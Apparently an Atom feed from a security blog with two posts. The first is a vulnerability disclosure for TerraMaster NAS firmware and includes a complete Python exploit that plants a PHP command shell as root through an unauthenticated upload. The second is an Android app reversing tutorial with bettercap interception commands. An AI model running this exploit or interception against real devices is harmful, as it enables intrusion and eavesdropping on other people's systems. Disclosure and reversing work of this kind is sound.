      <category term="server name indication" scheme="https://www.evilsocket.net/tags/server-name-indication/"/>
    
      <category term="privacy" scheme="https://www.evilsocket.net/tags/privacy/"/>
    
  </entry>
  
  <entry>
    <title>TerraMaster NAS TOS &lt;= 3.0.30 Unauthenticated RCE as Root</title>
    <link href="https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/"/>
    <id>https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/</id>
    <published>2017-05-30T11:15:28.000Z</published>
    <updated>2019-10-19T08:14:27.112Z</updated>
    
    <content type="html"><![CDATA[<p>Recently I bought a TerraMaster F2-420 NAS from Amazon in order to store my private code, backups and this kind of stuff. As soon as it arrived I started to play with its web interface and eventually I wanted to see how it was implemented, moreover I was curious to see if I could find any remotely exploitable vulnerability.</p>
<p>As you can see … I succeeded :)</p>
<p><img src="/images/2017/05/exploit.png" alt="nas"></p>
<a id="more"></a>
<p>Once connected to the NAS through SSH, I realized the whole interface was a PHP application stored on <code>/usr/www/</code>, but unfortunately the source code was obfuscated:</p>
<p><img src="/images/2017/05/obfuscated.png" alt="obfuscated"></p>
<p>Printing PHP compilation options and modules revealed what kind of obfuscation was going on, <code>php_screw</code>:</p>
<p><img src="/images/2017/05/configure.png" alt="configure"></p>
<p>Lucky me, there’s the <a href="https://github.com/dehydr8/php_unscrew" target="_blank" rel="noopener">php_unscrew</a> tool written by Osama Khalid, I only had to follow the instructions on the repository in order to extract the key and header length from the encrypted files on the NAS, which happened to be <code>d311ea00d301b80c3f00</code> and <code>13</code>.</p>
<p><img src="/images/2017/05/bingo.png" alt="bingo"></p>
<p>At this stage, I could read any PHP file running on the NAS, until I found what I’ve been looking for, <code>/usr/www/include/upload.php</code> which, as you guessed, handles file uploads to the NAS … and here’s all the authentication involved:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$targetDir = $_REQUEST[<span class="string">'targetDir'</span>];</span><br><span class="line">$file_path = @realpath($targetDir);</span><br><span class="line"><span class="keyword">if</span>(strstr($file_path, <span class="string">"/mnt/base/update"</span>) === <span class="keyword">false</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!$_COOKIE[<span class="string">'kod_name'</span>])&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 104, "message": "You are not login!"&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>TL;DR; As long as you set the <code>kod_name</code> cookie to <strong>any</strong> value, the system considers you as authenticated and lets you <strong>upload any file to any location on the file system</strong> … oh, did I mention that the web server <strong>is running as root</strong>? </p>
<p><img src="/images/2015/Jan/major-facepalm.jpg" alt="facepalm"></p>
<p>I contacted the vendor on May 11 and initially they seemed to care assuring me an update would have been released in a couple of days … 19 days ellapsed, still no fixes and they’re ignoring my emails now, so I decided to go full disclosure.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit: Unauthenticated RCE as root.</span></span><br><span class="line"><span class="comment"># Vendor: TerraMaster</span></span><br><span class="line"><span class="comment"># Product: TOS &lt;= 3.0.30 (running on every NAS)</span></span><br><span class="line"><span class="comment"># Author: Simone 'evilsocket' Margaritelli &lt;evilsocket@protonmail.com&gt; </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">( address, port, filename, path = <span class="string">'/usr/www/'</span> )</span>:</span></span><br><span class="line">    url = <span class="string">"http://%s:%d/include/upload.php?targetDir=%s"</span> % ( address, port, path )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        files = &#123; <span class="string">'file'</span>: open( filename, <span class="string">'rb'</span> ) &#125;</span><br><span class="line">        cookies = &#123; <span class="string">'kod_name'</span>: <span class="string">'1'</span> &#125; <span class="comment"># LOL :D</span></span><br><span class="line">        r = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.text != <span class="string">'&#123;"jsonrpc" : "2.0", "result" : null, "id" : "id"&#125;'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"! Unexpected response, exploit might not work:\n%s\n"</span> % r.text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n! ERROR: %s"</span> % e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span><span class="params">( address, port, command )</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open( <span class="string">'/tmp/p.php'</span>, <span class="string">'w+t'</span> ) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write( <span class="string">"&lt;?php system('%s'); ?&gt;"</span> % command )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> upload( address, port, <span class="string">'/tmp/p.php'</span> ) == <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://%s:%d/p.php"</span> % ( address, port )</span><br><span class="line">            <span class="keyword">return</span> requests.get(url).text</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"\n! ERROR: %s"</span> % e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: exploit.py &lt;ip|hostname&gt; &lt;command&gt; (port=8181)\n"</span></span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">target  = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line">port    = <span class="number">8181</span> <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span> <span class="keyword">else</span> int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">out = rce( target, port, command )</span><br><span class="line"><span class="keyword">if</span> out <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">print</span> out.strip()</span><br></pre></td></tr></table></figure>
<h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li>Use a firewall to disable access to port <code>8181</code> of the NAS from untrusted users.</li>
<li>If possible (NAS only used via SMB/NFS/SSH) completely delete the web ui.</li>
<li>Hope for the vendor to quickly release a fix.</li>
<li>Alternatively, <strong>buy another and more secure NAS</strong> :)</li>
</ul>
<h3 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h3><ul>
<li>11 May 2017: Initial report to TerraMaster.</li>
<li>12 May 2017: TM acknowledged the issue and promised a fix within <em>a couple of days</em>.</li>
<li>16 May 2017: Follow up, still no fix.</li>
<li>25 May 2017: Follow up, still no fix.</li>
<li>29 May 2017: Follow up, still no fix and no answers neither.</li>
<li>30 May 2017: Disclosure.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Recently I bought a TerraMaster F2-420 NAS from Amazon in order to store my private code, backups and this kind of stuff. As soon as it arrived I started to play with its web interface and eventually I wanted to see how it was implemented, moreover I was curious to see if I could find any remotely exploitable vulnerability.&lt;/p&gt;
&lt;p&gt;As you can see … I succeeded :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/05/exploit.png&quot; alt=&quot;nas&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="vulnerability" scheme="https://www.evilsocket.net/tags/vulnerability/"/>
    
      <category term="exploit" scheme="https://www.evilsocket.net/tags/exploit/"/>
    
      <category term="rce" scheme="https://www.evilsocket.net/tags/rce/"/>
    
      <category term="disclosure" scheme="https://www.evilsocket.net/tags/disclosure/"/>
    
      <category term="terramaster" scheme="https://www.evilsocket.net/tags/terramaster/"/>
    
      <category term="nas" scheme="https://www.evilsocket.net/tags/nas/"/>
    
  </entry>
  
  <entry>
    <title>Android Applications Reversing 101</title>
    <link href="https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/"/>
    <id>https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/</id>
    <published>2017-04-27T17:09:48.000Z</published>
    <updated>2019-10-19T08:14:27.104Z</updated>
    
    <content type="html"><![CDATA[<p>Every day we see a bunch of new Android applications being published on the Google Play Store, from games, to utilities, to IoT devices clients and so forth, almost every single aspect of our life can be somehow controlled with “an app”. We have smart houses, <a href="https://www.evilsocket.net/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">smart fitness devices</a> and <a href="https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/">smart coffee machines</a> … but is this stuff just smart or is it <strong>secure</strong> as well? :)</p>
<p>Reversing an Android application can be a (relatively) easy and fun way to answer this question, that’s why I decided to write this blog post where I’ll try to explain the basics and give you some of my “tricks” to reverse this stuff faster and more effectively.</p>
<p>I’m not going to go very deep into technical details, you can learn yourself how Android works, how the Dalvik VM works and so forth, this is gonna be a <strong>very basic practical guide</strong> instead of a post full of theoretical stuff but no really useful contents.</p>
<p>Let’s start! :)</p>
<p><img src="/images/2017/04/head.jpeg" alt="start"></p>
<a id="more"></a>
<h3 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h3><p>In order to follow this introduction to APK reversing there’re a few prerequisites:</p>
<ul>
<li>A working brain ( I don’t give this for granted anymore … ).</li>
<li>An Android smartphone ( doh! ).</li>
<li>You have a basic knowledge of the <a href="https://en.wikipedia.org/wiki/Java_(programming_language" target="_blank" rel="noopener">Java programming language</a> (you understand it if you read it).</li>
<li>You have the <a href="http://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html" target="_blank" rel="noopener">JRE</a> installed on your computer.</li>
<li>You have <a href="https://developer.android.com/studio/command-line/adb.html" target="_blank" rel="noopener">adb</a> installed.</li>
<li>You have the <code>Developer Options</code> and <code>USB Debugging</code> enabled on your smartphone.</li>
</ul>
<h3 id="What-is-an-APK"><a href="#What-is-an-APK" class="headerlink" title="What is an APK?"></a>What is an APK?</h3><p>An Android application is packaged as an <strong>APK</strong> ( <em>Android Package</em> ) file, which is essentially a ZIP file containing the compiled code, the resources, signature, manifest and every other file the software needs in order to run. Being it a ZIP file, we can start looking at its contents using the <code>unzip</code> command line utility ( or any other unarchiver you use ):</p>
<pre><code>unzip application.apk -d application
</code></pre><p>Here’s what you will find inside an APK.</p>
<pre><code>/AndroidManifest.xml (file)
</code></pre><p>This is the binary representation of the XML manifest file describing what permissions the application will request (keep in mind that some of the permissions might be requested at runtime by the app and not declared here), what activities ( GUIs ) are in there, what services ( stuff running in the background with no UI ) and what receivers ( classes that can receive and handle system events such as the device boot or an incoming SMS ). </p>
<p>Once decompiled (more on this later), it’ll look like this:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">package</span>=<span class="string">"com.company.appname"</span> </span></span><br><span class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionCode</span>=<span class="string">"24"</span> </span></span><br><span class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionName</span>=<span class="string">"7.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span> <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.company.appname.MainActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Keep in mind that this is the perfect starting point to isolate the application “entry points”, namely the classes you’ll reverse first in order to understand the logic of the whole software. In this case for instance, we would start inspecting the <code>com.company.appname.MainActivity</code> class being it declared as the main UI for the application.</p>
<pre><code>/assets/* ( folder )
</code></pre><p>This folder will contain application specific files, like wav files the app might need to play, custom fonts and so on. Reversing-wise it’s usually not very important, unless of course you find inside the software functional references to such files.</p>
<pre><code>/res/* ( folder )
</code></pre><p>All the resources, like the activities xml files, images and custom styles are stored here.</p>
<pre><code>/resources.arsc ( file )
</code></pre><p>This is the “index” of all the resources, long story short, at each resource file is assigned a numeric identifier that the app will use in order to identify that specific entry and the <code>resources.arsc</code> file maps these files to their identifiers … nothing very interesting about it.</p>
<pre><code>/classes.dex ( file )
</code></pre><p>This file contains the Dalvik ( the virtual machine running Android applications ) bytecode of the app, let me explain it better. An Android application is (most of the times) developed using the Java programming language. The java source files are then compiled into this bytecode which the Dalvik VM eventually will execute … pretty much what happens to normal Java programs when they’re compiled to <code>.class</code> files.</p>
<p>Long story short, this file contains the logic, that’s what we’re interested into.</p>
<p>Sometimes you’ll also find a <code>classes2.dex</code> file, this is due to the DEX format which has a limit to the number of classes you can declare inside a single dex file, at some point in history Android apps became bigger and bigger and so Google had to adapt this format, supporting a secondary <code>.dex</code> file where other classes can be declared.</p>
<p>From our perspective it doesn’t matter, the tools we’re going to use are able to detect it and append it to the decompilation pipeline.</p>
<pre><code>/libs/ ( folder )
</code></pre><p>Sometimes an app needs to execute native code, it can be an image processing library, a game engine or whatever. In such case, those <code>.so</code> ELF libraries will be found inside the <code>libs</code> folder, divided into architecture specific subfolders ( so the app will run on ARM, ARM64, x86, etc ).</p>
<pre><code>/META-INF/ ( folder )
</code></pre><p>Every Android application needs to be signed with a developer certificate in order to run on a device, even debug builds are signed by a debug certificate, the <code>META-INF</code> folder contains information about the files inside the APK and about the developer.</p>
<p>Inside this folder, you’ll usually find:</p>
<ul>
<li>A <code>MANIFEST.MF</code> file with the SHA-1 or SHA-256 hashes of <strong>all</strong> the files inside the APK.</li>
<li>A <code>CERT.SF</code> file, pretty much like the MANIFEST.MF, but signed with the <code>RSA</code> key.</li>
<li>A <code>CERT.RSA</code> file which contains the developer public key used to sign the <code>CERT.SF</code> file and digests.</li>
</ul>
<p>Those files are very important in order to guarantee the APK integrity and the ownership of the code. Sometimes inspecting such signature can be very handy to determine who really developed a given APK. If you want to get information about the developer, you can use the <code>openssl</code> command line utility:</p>
<pre><code>openssl pkcs7 -in /path/to/extracted/apk/META-INF/CERT.RSA -inform DER -print
</code></pre><p>This will print an output like:</p>
<pre><code>PKCS7: 
  type: pkcs7-signedData (1.2.840.113549.1.7.2)
  d.sign: 
    version: 1
    md_algs:
        algorithm: sha1 (1.3.14.3.2.26)
        parameter: NULL
    contents: 
      type: pkcs7-data (1.2.840.113549.1.7.1)
      d.data: &lt;ABSENT&gt;
    cert:
        cert_info: 
          version: 2
          serialNumber: 10394279457707717180
          signature: 
            algorithm: sha1WithRSAEncryption (1.2.840.113549.1.1.5)
            parameter: NULL
          issuer: C=TW, ST=Taiwan, L=Taipei, O=ASUS, OU=PMD, CN=ASUS AMAX Key/emailAddress=admin@asus.com
          validity: 
            notBefore: Jul  8 11:39:39 2013 GMT
            notAfter: Nov 23 11:39:39 2040 GMT
          subject: C=TW, ST=Taiwan, L=Taipei, O=ASUS, OU=PMD, CN=ASUS AMAX Key/emailAddress=admin@asus.com
          key: 
            algor: 
              algorithm: rsaEncryption (1.2.840.113549.1.1.1)
              parameter: NULL
            public_key:  (0 unused bits)
              ...
              ...
              ...
</code></pre><p>This can be gold for us, for instance we could use this information to determine if an app was really signed by (let’s say) Google or if it was resigned, therefore modified, by a third party.</p>
<h3 id="How-do-I-get-the-APK-of-an-app"><a href="#How-do-I-get-the-APK-of-an-app" class="headerlink" title="How do I get the APK of an app?"></a>How do I get the APK of an app?</h3><p>Now that we have a basic idea of what we’re supposed to find inside an APK, we need a way to actually get the APK file of the application we’re interested into. There are two ways, either you install it on your device and use <code>adb</code> to get it, or you use an online service to download it.</p>
<h5 id="Pulling-an-app-with-ADB"><a href="#Pulling-an-app-with-ADB" class="headerlink" title="Pulling an app with ADB"></a>Pulling an app with ADB</h5><p>First of all let’s plug our smartphone to the USB port of our computer and get a list of the installed packages and their namespaces:</p>
<pre><code>adb shell pm list packages
</code></pre><p>This will list all packages on your smartphone, once you’ve found the namespace of the package you want to reverse ( <code>com.android.systemui</code> in this example ), let’s see what its physical path is:</p>
<pre><code>adb shell pm path com.android.systemui
</code></pre><p>Finally, we have the APK path:</p>
<pre><code>package:/system/priv-app/SystemUIGoogle/SystemUIGoogle.apk
</code></pre><p>Let’s pull it from the device:</p>
<pre><code>adb pull /system/priv-app/SystemUIGoogle/SystemUIGoogle.apk
</code></pre><p>And here you go, you have the APK you want to reverse!</p>
<h5 id="Using-an-Online-Service"><a href="#Using-an-Online-Service" class="headerlink" title="Using an Online Service"></a>Using an Online Service</h5><p>Multiple online services are available if you don’t want to install the app on your device (for instance, if you’re reversing a malware, you want to start having the file first, then installing on a clean device only afterwards), here’s a list of the ones I use:</p>
<ul>
<li><a href="https://apk-dl.com/" target="_blank" rel="noopener">Apk-DL</a></li>
<li><a href="https://apps.evozi.com/apk-downloader/" target="_blank" rel="noopener">Evozi Downloader</a></li>
<li><a href="http://apkleecher.com/" target="_blank" rel="noopener">Apk Leecher</a></li>
</ul>
<p>Keep in mind that once you download the APK from these services, it’s a good idea to check the developer certificate as previously shown in order to be 100% sure you downloaded the correct APK and not some repackaged and resigned stuff full of ads and possibly malware.</p>
<h3 id="Network-Analysis"><a href="#Network-Analysis" class="headerlink" title="Network Analysis"></a>Network Analysis</h3><p>Now we start with some tests in order to understand what the app is doing while executed. My first test usually consists in inspecting the network traffic being generated by the application itself and, in order to do that, my tool of choice is <a href="https://bettercap.org/" target="_blank" rel="noopener">bettercap</a> … well, that’s why I developed it in the first place :P</p>
<p>Make sure you have bettercap installed and that both your computer and the Android device are on the same wifi network, then you can start MITM-ing the smartphone ( <code>192.168.1.5</code> in this example ) and see its traffic in realtime from the terminal:</p>
<pre><code>sudo bettercap -T 192.168.1.5 -X
</code></pre><p>The <code>-X</code> option will enable the sniffer, as soon as you start the app you should see a bunch of HTTP and/or HTTPS servers being contacted, now you know who the app is sending the data to, let’s now see <strong>what</strong> data it is sending:</p>
<pre><code>sudo bettercap -T 192.168.1.5 --proxy --proxy-https --no-sslstrip
</code></pre><p>This will switch from passive sniffing mode, to proxying mode. All the HTTP and HTTPS traffic will be intercepted (and, if neeeded, modified) by bettercap.<br>If the app is correctly using <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning" target="_blank" rel="noopener">public key pinning</a> (<strong>as every application should</strong>) you will <strong>not</strong> be able to see its HTTPS traffic but, unfortunately, in my experience this only happens for a very small number of apps.</p>
<p>From now on, keep triggering actions on the app while inspecting the traffic ( you can also use <code>Wireshark</code> in parallel to get a <code>PCAP</code> capture file to inspect it later ) and after a while you should have a more or less complete idea of what protocol it’s using and for what purpose.</p>
<p><img src="/images/2017/04/bettercap.png" alt="bettercap"></p>
<h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>After the network analysis, we collected a bunch of URLs and packets, we can use this information as our starting point, that’s what we will be looking for while performing static analysis on the app. “Static analysis” means that you will <strong>not</strong> execute the app now, but you’ll rather just study its code. Most of the times this is all you’ll ever need to reverse something.</p>
<p>There’re different tools you can use for this purpose, let’s take a look at the most popular ones.</p>
<h4 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h4><p><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="noopener">APKTool</a> is the very first tool you want to use, it is capable of decompiling the <code>AndroidManifest</code> file to its original XML format, the <code>resources.arsc</code> file and it will also convert the <code>classes.dex</code> ( and <code>classes2.dex</code> if present ) file to an intermediary language called <code>SMALI</code>, an ASM-like language used to represent the Dalvik VM opcodes as a human readable language.</p>
<p>It looks like:</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> main([<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"><span class="keyword">    .registers</span> 2</span><br><span class="line">   <span class="built_in"> sget-object </span>v0, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line">   <span class="built_in"> const-string	</span>v1, <span class="string">"Hello World!"</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v1&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>
<p>But don’t worry, in most of the cases this is not the final language you’re gonna read to reverse the app ;)</p>
<p>Given an APK, this command line will decompile it:</p>
<pre><code>apktool d application.apk
</code></pre><p>Once finished, the <code>application</code> folder is created and you’ll find all the output of apktool in there.</p>
<p>You can also use <code>apktool</code> to decompile an APK, modify it and then recompile it ( like <a href="https://www.evilsocket.net/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">i did</a> with the Nike+ app in order to have more debug logs for instance ), but unless the other tools will fail the decompilation, it’s unlikely that you’ll need to read <code>smali</code> code in order to reverse the application, let’s get to the other tools now ;)</p>
<h4 id="jADX"><a href="#jADX" class="headerlink" title="jADX"></a>jADX</h4><p>The <a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">jADX</a> suite allows you to simply load an APK and look at its Java source code. What’s happening under the hood is that jADX is decompiling the APK to smali and then converting the smali back to Java. Needless to say, reading Java code is much easier than reading smali as I already mentioned :)</p>
<p>Once the APK is loaded, you’ll see a UI like this:</p>
<p><img src="https://camo.githubusercontent.com/bd3c0ea851c23c4535e43590a86c940a0786faa6/687474703a2f2f736b796c6f742e6769746875622e696f2f6a6164782f6a6164782d6775692e706e67" alt="jADX"></p>
<p>One of the best features of jADX is the string/symbol search ( the <img style="display:inline" src="https://raw.githubusercontent.com/skylot/jadx/master/jadx-gui/src/main/resources/icons-16/wand.png"> button ) that will allow you to search for URLs, strings, methods and whatever you want to find inside the codebase of the app.</p>
<p>Also, there’s the <code>Find Usage</code> menu option, just highlight some symbol and right click on it, this feature will give you a list of every references to that symbol.</p>
<h4 id="Dex2Jar-and-JD-Gui"><a href="#Dex2Jar-and-JD-Gui" class="headerlink" title="Dex2Jar and JD-Gui"></a>Dex2Jar and JD-Gui</h4><p>Similar to jADX are the <a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="noopener">dex2jar</a> and <a href="http://jd.benow.ca/" target="_blank" rel="noopener">JD-GUI</a> tools, once installed, you’ll use <code>dex2jar</code> to convert an APK to a JAR file:</p>
<pre><code>/path/to/dex2jar/d2j-dex2jar.sh application.apk
</code></pre><p>Once you have the JAR file, simply open it with JD-GUI and you’ll see its Java code, pretty much like jADX:</p>
<p><img src="http://jd.benow.ca/img/screenshot17.png" alt="JD-GUI"></p>
<p>Unfortunately JD-GUI is not as features rich as jADX, but sometimes when one tool fails you have to try another one and hope to be more lucky.</p>
<h4 id="JEB"><a href="#JEB" class="headerlink" title="JEB"></a>JEB</h4><p>As your last resort, you can try the <a href="https://www.pnfsoftware.com/jeb2/" target="_blank" rel="noopener">JEB</a> decompiler. It’s a <strong>very</strong> good software, but unfortunately it’s not free, there’s a trial version if you want to give it a shot, here’s how it looks like:</p>
<p><img src="/images/2017/04/jeb.png" alt="JEB"></p>
<p>JEB also features an ARM disassembler ( useful when there’re native libraries in the APK ) and a debugger ( <strong>very</strong> useful for dynamic analysis ), but again, it’s not free and it’s not cheap.</p>
<h4 id="Static-Analysis-of-Native-Binaries"><a href="#Static-Analysis-of-Native-Binaries" class="headerlink" title="Static Analysis of Native Binaries"></a>Static Analysis of Native Binaries</h4><p>As previously mentioned, sometimes you’ll find native libraries ( <code>.so</code> shared objects ) inside the <code>lib</code> folder of the APK and, while reading the Java code, you’ll find <code>native</code> methods declarations like the following:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringFromJNI</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>The <code>native</code> keyword means that the method implementation is not inside the <code>dex</code> file but, instead, it’s declared and executed from native code trough what is called a <code>Java Native Interface</code> or <a href="https://developer.android.com/ndk/samples/sample_hellojni.html" target="_blank" rel="noopener">JNI</a>.</p>
<p>Close to native methods you’ll also usually find something like this:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">"hello-jni"</span>);</span><br></pre></td></tr></table></figure>
<p>Which will tell you in which native library the method is implemented. In such cases, you will need an ARM ( or x86 if there’s a x86 subfolder inside the <code>libs</code> folder ) disassembler in order to reverse the native object.</p>
